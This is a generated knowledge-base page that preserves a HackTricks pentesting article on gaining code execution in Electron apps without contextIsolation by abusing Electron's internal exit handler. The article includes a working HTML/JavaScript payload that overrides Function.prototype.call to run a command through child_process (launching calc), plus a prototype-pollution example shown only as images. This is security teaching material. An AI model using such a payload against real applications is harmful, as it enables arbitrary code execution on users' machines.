---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Electron contextIsolation RCE via Electron internal code

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-network-services-pentesting-pentesting-web-electron-desktop-apps-electron-contextisolation-rce-via-electron-internal-code` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-electron-internal-code.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Electron contextIsolation RCE via Electron internal code](../../topics/network-services-pentesting/electron-contextisolation-rce-via-electron-internal-code.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-network-services-pentesting-pentesting-web-electron-desktop-apps-electron-contextisolation-rce-via-electron-internal-code |
| name | Electron contextIsolation RCE via Electron internal code |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-electron-internal-code.md |

## Preserved Source Material

````yaml
_body: "# Electron contextIsolation RCE via Electron internal code\n\n{{#include ../../../banners/hacktricks-training.md}}\n\
  \n## Example 1\n\nExample from [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)\n\
  \n\"exit\" event listener is always set by the internal code when de page loading is started. This event is emitted just\
  \ before navigation:\n\n```javascript\nprocess.on(\"exit\", function () {\n  for (let p in cachedArchives) {\n    if (!hasProp.call(cachedArchives,\
  \ p)) continue\n    cachedArchives[p].destroy()\n  }\n})\n```\n\n\n{{#ref}}\nhttps://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36\n\
  {{#endref}}\n\n![](<../../../images/image (1070).png>)\n\nhttps://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/bin/events.js#L156-L231\
  \ -- No longer exists\n\nThen it goes here:\n\n![](<../../../images/image (793).png>)\n\nWhere \"self\" is Node's process\
  \ object:\n\n![](<../../../images/image (700).png>)\n\nThe process object has a references to \"require\" function:\n\n\
  ```\nprocess.mainModule.require\n```\n\nAs the handler.call is going to receive the process object we can overwrite it to\
  \ execute arbitrary code:\n\n```html\n<script>\n  Function.prototype.call = function (process) {\n    process.mainModule.require(\"\
  child_process\").execSync(\"calc\")\n  }\n  location.reload() //Trigger the \"exit\" event\n</script>\n```\n\n## Example\
  \ 2\n\nGet **require object from prototype pollution**. From [https://www.youtube.com/watch?v=Tzo8ucHA5xw\\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\\\
  &index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)\n\nLeak:\n\n<figure><img\
  \ src=\"../../../images/image (279).png\" alt=\"\"><figcaption></figcaption></figure>\n\nExploit:\n\n<figure><img src=\"\
  ../../../images/image (89).png\" alt=\"\"><figcaption></figcaption></figure>\n\n{{#include ../../../banners/hacktricks-training.md}}"
_relative_path: network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-electron-internal-code.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-electron-internal-code.md
````
